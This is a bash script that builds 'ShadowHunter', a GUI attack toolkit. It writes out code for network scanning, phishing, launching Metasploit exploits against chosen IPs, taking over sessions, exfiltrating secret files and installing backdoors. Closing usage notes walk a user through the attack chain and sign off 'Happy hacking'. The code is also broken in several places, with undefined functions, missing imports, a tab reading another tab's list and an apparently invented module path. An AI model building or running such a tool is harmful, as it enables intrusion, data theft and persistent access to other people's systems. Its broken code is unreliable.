#!/bin/bash

# Function to check if a command exists
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# Update and upgrade the system
echo "Updating and upgrading the system..."
sudo apt update
sudo apt upgrade -y

# Install necessary system packages
echo "Installing system packages..."
sudo apt install -y python3-pip python3-pyqt5 scapy metasploit-framework

# Install Python packages
echo "Installing Python packages..."
pip3 install msfrpc bluetooth

# Create the project directory structure
echo "Creating project directory structure..."
mkdir -p ShadowHunter/{gui/resources/icons,gui/resources/styles,core,utils,logs,configs}

# Create example icon files
echo "Creating example icon files..."
convert -size 64x64 xc:black -fill white -draw "circle 32,32 32,32" ShadowHunter/gui/resources/icons/target_icon.png
convert -size 64x64 xc:black -fill white -draw "rectangle 20,20 44,44" ShadowHunter/gui/resources/icons/exploit_icon.png
convert -size 64x64 xc:black -fill white -draw "polygon 32,10 42,42 22,42" ShadowHunter/gui/resources/icons/control_icon.png

# Create CSS style files
echo "Creating CSS style files..."
cat <<EOL > ShadowHunter/gui/resources/styles/main_style.css
/* main_style.css */
QMainWindow {
    background-color: #2e2e2e;
    color: #ffffff;
    font-family: "Segoe UI", Arial, sans-serif;
}

QTabWidget::pane {
    border: none;
    background: #3a3a3a;
}

QTabBar::tab {
    background: #4a4a4a;
    border: 1px solid #5a5a5a;
    border-bottom: none;
    color: #ffffff;
    padding: 10px;
    min-width: 10ex;
    min-height: 20ex;
}

QTabBar::tab:selected {
    background: #5a5a5a;
    border-color: #6a6a6a;
}

QPushButton {
    background-color: #4a4a4a;
    color: #ffffff;
    border: 1px solid #5a5a5a;
    padding: 5px 10px;
    border-radius: 5px;
}

QPushButton:hover {
    background-color: #5a5a5a;
}

QListWidget {
    background-color: #3a3a3a;
    color: #ffffff;
    border: 1px solid #5a5a5a;
    padding: 5px;
}

QListWidget::item {
    background-color: #4a4a4a;
    color: #ffffff;
    padding: 5px;
    border: 1px solid #5a5a5a;
    border-radius: 5px;
}

QListWidget::item:selected {
    background-color: #5a5a5a;
}
EOL

cat <<EOL > ShadowHunter/gui/resources/styles/tab_style.css
/* tab_style.css */
QWidget {
    background-color: #3a3a3a;
    color: #ffffff;
    font-family: "Segoe UI", Arial, sans-serif;
}

QLabel {
    color: #ffffff;
}

QLineEdit {
    background-color: #4a4a4a;
    color: #ffffff;
    border: 1px solid #5a5a5a;
    padding: 5px;
    border-radius: 5px;
}

QLineEdit:focus {
    border: 1px solid #6a6a6a;
}

QCheckBox {
    color: #ffffff;
}

QCheckBox::indicator {
    width: 18px;
    height: 18px;
}

QCheckBox::indicator:unchecked {
    image: url(:/icons/unchecked.png);
}

QCheckBox::indicator:checked {
    image: url(:/icons/checked.png);
}

QComboBox {
    background-color: #4a4a4a;
    color: #ffffff;
    border: 1px solid #5a5a5a;
    padding: 5px;
    border-radius: 5px;
}

QComboBox::drop-down {
    subcontrol-origin: padding;
    subcontrol-position: top right;
    width: 20px;
    border-left-width: 1px;
    border-left-color: #5a5a5a;
    border-left-style: solid;
    border-top-right-radius: 3px;
    border-bottom-right-radius: 3px;
}

QComboBox::down-arrow {
    image: url(:/icons/down_arrow.png);
    width: 16px;
    height: 16px;
}

QProgressBar {
    background-color: #4a4a4a;
    color: #ffffff;
    border: 1px solid #5a5a5a;
    border-radius: 5px;
    text-align: center;
}

QProgressBar::chunk {
    background-color: #6a6a6a;
    width: 20px;
    margin: 0.5px;
}
EOL

# Create the resources.qrc file
echo "Creating resources.qrc file..."
cat <<EOL > ShadowHunter/gui/resources/resources.qrc
<RCC>
    <qresource prefix="/">
        <file>icons/target_icon.png</file>
        <file>icons/exploit_icon.png</file>
        <file>icons/control_icon.png</file>
        <file>styles/main_style.css</file>
        <file>styles/tab_style.css</file>
    </qresource>
</RCC>
EOL

# Compile the resources.qrc file
echo "Compiling resources.qrc file..."
pyrcc5 ShadowHunter/gui/resources/resources.qrc -o ShadowHunter/gui/resources/resources_rc.py

# Create the requirements.txt file
echo "Creating requirements.txt file..."
cat <<EOL > ShadowHunter/requirements.txt
PyQt5
scapy
metasploit
msfrpc
bluetooth
EOL

# Create the ShadowHunter.py file
echo "Creating ShadowHunter.py file..."
cat <<EOL > ShadowHunter/ShadowHunter.py
import sys
from PyQt5.QtWidgets import QApplication
from gui.main_window import MainWindow
from gui.resources import resources_rc  # Import the compiled resources

def apply_styles():
    # Apply main style
    file = QFile(":/styles/main_style.css")
    file.open(QFile.ReadOnly | QFile.Text)
    stream = QTextStream(file)
    app.setStyleSheet(stream.readAll())

    # Apply tab style
    file = QFile(":/styles/tab_style.css")
    file.open(QFile.ReadOnly | QFile.Text)
    stream = QTextStream(file)
    app.setStyleSheet(stream.readAll())

def main():
    global app
    app = QApplication(sys.argv)
    apply_styles()
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()
EOL

# Create the main_window.py file
echo "Creating main_window.py file..."
cat <<EOL > ShadowHunter/gui/main_window.py
from PyQt5.QtWidgets import QMainWindow, QAction, QTabWidget, QVBoxLayout, QWidget
from gui.target_tab import TargetTab
from gui.exploit_tab import ExploitTab
from gui.control_tab import ControlTab

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("ShadowHunter")
        self.setGeometry(100, 100, 800, 600)

        # Create tabs
        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)

        # Add tabs
        self.target_tab = TargetTab()
        self.exploit_tab = ExploitTab()
        self.control_tab = ControlTab()

        self.tabs.addTab(self.target_tab, "Target Discovery")
        self.tabs.addTab(self.exploit_tab, "Exploit Discovery")
        self.tabs.addTab(self.control_tab, "System Control")

        # Menu bar
        self.init_menu()

    def init_menu(self):
        menu_bar = self.menuBar()

        file_menu = menu_bar.addMenu("File")
        exit_action = QAction("Exit", self)
        exit_action.triggered.connect(self.close)
        file_menu.addAction(exit_action)
EOL

# Create the target_tab.py file
echo "Creating target_tab.py file..."
cat <<EOL > ShadowHunter/gui/target_tab.py
from PyQt5.QtWidgets import QWidget, QVBoxLayout, QPushButton, QListWidget
from core.target_discovery import discover_targets, phishing_attack

class TargetTab(QWidget):
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout()

        self.target_list = QListWidget()
        layout.addWidget(self.target_list)

        discover_button = QPushButton("Discover Targets")
        discover_button.clicked.connect(self.discover_targets)
        layout.addWidget(discover_button)

        phishing_button = QPushButton("Phishing Attack")
        phishing_button.clicked.connect(self.phishing_attack)
        layout.addWidget(phishing_button)

        self.setLayout(layout)

    def discover_targets(self):
        targets = discover_targets()
        self.target_list.clear()
        for target in targets:
            self.target_list.addItem(f"{target['ip']} - {target['os']}")

    def phishing_attack(self):
        selected_items = self.target_list.selectedItems()
        if selected_items:
            target_ip = selected_items[0].text().split(" - ")[0]
            phishing_attack(target_ip)
EOL

# Create the exploit_tab.py file
echo "Creating exploit_tab.py file..."
cat <<EOL > ShadowHunter/gui/exploit_tab.py
from PyQt5.QtWidgets import QWidget, QVBoxLayout, QPushButton, QListWidget
from core.exploit_discovery import find_exploits
from core.exploit_initiation import initiate_exploit

class ExploitTab(QWidget):
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout()

        self.exploit_list = QListWidget()
        layout.addWidget(self.exploit_list)

        discover_button = QPushButton("Find Exploits")
        discover_button.clicked.connect(self.find_exploits)
        layout.addWidget(discover_button)

        initiate_button = QPushButton("Initiate Exploit")
        initiate_button.clicked.connect(self.initiate_exploit)
        layout.addWidget(initiate_button)

        self.setLayout(layout)

    def find_exploits(self):
        selected_items = self.target_list.selectedItems()
        if selected_items:
            target_info = {"os": selected_items[0].text().split(" - ")[1]}
            exploits = find_exploits(target_info)
            self.exploit_list.clear()
            for exploit in exploits:
                self.exploit_list.addItem(exploit['name'])

    def initiate_exploit(self):
        selected_items = self.exploit_list.selectedItems()
        if selected_items:
            exploit = selected_items[0].text()
            target_ip = self.target_list.selectedItems()[0].text().split(" - ")[0]
            initiate_exploit(exploit, target_ip)
EOL

# Create the control_tab.py file
echo "Creating control_tab.py file..."
cat <<EOL > ShadowHunter/gui/control_tab.py
from PyQt5.QtWidgets import QWidget, QVBoxLayout, QPushButton, QListWidget
from core.system_control import gain_control, exfiltrate_data
from core.backdoor import install_backdoor

class ControlTab(QWidget):
    def __init__(self):
        super().__init__()
        layout = QVBoxLayout()

        self.session_list = QListWidget()
        layout.addWidget(self.session_list)

        control_button = QPushButton("Gain Control")
        control_button.clicked.connect(self.gain_control)
        layout.addWidget(control_button)

        exfiltrate_button = QPushButton("Exfiltrate Data")
        exfiltrate_button.clicked.connect(self.exfiltrate_data)
        layout.addWidget(exfiltrate_button)

        backdoor_button = QPushButton("Install Backdoor")
        backdoor_button.clicked.connect(self.install_backdoor)
        layout.addWidget(backdoor_button)

        self.setLayout(layout)

    def gain_control(self):
        selected_items = self.session_list.selectedItems()
        if selected_items:
            session_id = selected_items[0].text()
            session = gain_control(session_id)
            self.session_list.addItem(f"Session {session_id} controlled")

    def exfiltrate_data(self):
        selected_items = self.session_list.selectedItems()
        if selected_items:
            session_id = selected_items[0].text()
            file_path = "path/to/secret/file.txt"
            exfiltrate_data(session_id, file_path)

    def install_backdoor(self):
        selected_items = self.session_list.selectedItems()
        if selected_items:
            session_id = selected_items[0].text()
            install_backdoor(session_id)
EOL

# Create the target_discovery.py file
echo "Creating target_discovery.py file..."
cat <<EOL > ShadowHunter/core/target_discovery.py
import subprocess
from utils.network_utils import scan_network

def discover_targets():
    targets = []
    # Scan local network for devices
    network_scan = scan_network()
    for device in network_scan:
        if device['os'] == 'Windows' or device['os'] == 'Linux':
            targets.append(device)
    return targets

def phishing_attack(target_ip):
    # Set up a simple HTTP server to host phishing page
    subprocess.run(["python3", "-m", "http.server", "8000", "--directory", "phishing_pages"])
    # Send phishing email to target
    send_phishing_email(target_ip)
EOL

# Create the exploit_discovery.py file
echo "Creating exploit_discovery.py file..."
cat <<EOL > ShadowHunter/core/exploit_discovery.py
import requests

def find_exploits(target_info):
    exploits = []
    # Query exploit databases like Exploit-DB or Metasploit
    response = requests.get(f"https://www.exploit-db.com/search?q={target_info['os']}")
    for exploit in response.json():
        exploits.append(exploit)
    return exploits
EOL

# Create the exploit_initiation.py file
echo "Creating exploit_initiation.py file..."
cat <<EOL > ShadowHunter/core/exploit_initiation.py
from metasploit.msfrpc import MsfRpcClient

def initiate_exploit(exploit, target_ip):
    client = MsfRpcClient('password')
    exploit_module = client.modules.use('exploit', exploit['module'])
    payload = client.modules.use('payload', exploit['payload'])
    exploit_module['RHOSTS'] = target_ip
    exploit_module.execute(payload=payload)
EOL

# Create the system_control.py file
echo "Creating system_control.py file..."
cat <<EOL > ShadowHunter/core/system_control.py
from metasploit.msfrpc import MsfRpcClient

def gain_control(session_id):
    client = MsfRpcClient('password')
    session = client.sessions.session(session_id)
    return session

def exfiltrate_data(session, file_path):
    session.download(file_path)
EOL

# Create the backdoor.py file
echo "Creating backdoor.py file..."
cat <<EOL > ShadowHunter/core/backdoor.py
from metasploit.msfrpc import MsfRpcClient

def install_backdoor(session_id):
    client = MsfRpcClient('password')
    session = client.sessions.session(session_id)
    backdoor_module = client.modules.use('exploit', 'windows/local/backdoor')
    backdoor_module['SESSION'] = session_id
    backdoor_module.execute()
EOL

# Create the network_utils.py file
echo "Creating network_utils.py file..."
cat <<EOL > ShadowHunter/utils/network_utils.py
import scapy.all as scapy

def scan_network():
    arp_request = scapy.ARP(pdst="192.168.1.1/24")
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    devices = []
    for sent, received in answered_list:
        device = {"ip": received.psrc, "mac": received.hwsrc}
        devices.append(device)
    return devices
EOL

# Create the bluetooth_utils.py file
echo "Creating bluetooth_utils.py file..."
cat <<EOL > ShadowHunter/utils/bluetooth_utils.py
import bluetooth

def discover_bluetooth_devices():
    nearby_devices = bluetooth.discover_devices(lookup_names=True)
    return nearby_devices
EOL

# Create the wifi_utils.py file
echo "Creating wifi_utils.py file..."
cat <<EOL > ShadowHunter/utils/wifi_utils.py
import subprocess

def scan_wifi_networks():
    result = subprocess.run(['iwlist', 'wlan0', 'scan'], capture_output=True, text=True)
    return result.stdout
EOL

echo "Setup complete! You can now run the ShadowHunter application with the following steps:"

echo ""
echo "1. Navigate to the ShadowHunter directory:"
echo "   cd ShadowHunter"

echo "2. Run the application:"
echo "   python3 ShadowHunter.py"

echo ""
echo "Usage Instructions:"
echo "1. Target Discovery Tab:"
echo "   - Click 'Discover Targets' to scan for devices on your network."
echo "   - Select a target and click 'Phishing Attack' to initiate a phishing attack."

echo "2. Exploit Discovery Tab:"
echo "   - Select a target from the list and click 'Find Exploits' to search for known vulnerabilities."
echo "   - Select an exploit and click 'Initiate Exploit' to launch the attack."

echo "3. System Control Tab:"
echo "   - Gain control of the targeted system by clicking 'Gain Control'."
echo "   - Exfiltrate data by clicking 'Exfiltrate Data'."
echo "   - Install a backdoor by clicking 'Install Backdoor' to maintain persistent access."

echo ""
echo "Happy hacking with ShadowHunter!"